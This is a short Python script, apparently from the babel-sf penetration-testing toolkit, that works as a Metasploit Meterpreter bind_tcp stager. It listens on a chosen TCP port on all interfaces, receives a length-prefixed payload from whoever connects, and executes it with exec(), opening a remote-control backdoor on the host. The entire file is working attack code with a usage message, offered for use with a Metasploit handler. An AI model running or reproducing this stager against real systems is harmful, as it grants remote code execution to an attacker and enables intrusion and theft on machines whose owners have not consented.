#!/usr/bin/python
#
# msf-meterpreter-bind_tcp.py version 0.2
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#

import socket,struct
import sys
import datetime

i = datetime.datetime.today()

instructions = 	"msf-meterpreter-bind_tcp.py ( https://github.com/attackdebris/babel-sf )\n" +\
		"\n[This script should be utilised with a python/meterpreter/bind_tcp msf handler payload]\n" +\
		"\nUsage:" +\
		"\n  python msf-meterpreter-bind_tcp.py [bind port]" +\
		"\n  e.g. python msf-meterpreter-bind_tcp.py 4444"

if len(sys.argv) <2 or sys.argv[1] == "-h" or sys.argv[1] == "--h" or sys.argv[1] == "-help" or sys.argv[1] == "--help":
	print instructions
elif len(sys.argv) >2:
	print "Too many arguments, check your syntax."
elif len(sys.argv) ==2:
	port=int(sys.argv[1])
	s=socket.socket(2,1)
	s.bind (('0.0.0.0', port))
	print "Starting msf-meterpreter-bind_tcp.py ( https://github.com/attackdebris/babel-sf ) at %s-%s-%s %s:%s" % (i.year, i.month, i.day, i.hour, i.minute)
	print "Listening on TCP port %s...." % (port)
	s.listen(1)
	c,a=s.accept()
	l=struct.unpack('>I',c.recv(4))[0]
	d=c.recv(4096)
	while len(d)!=l:
	  d+=c.recv(4096)
	exec(d,{'s':c})
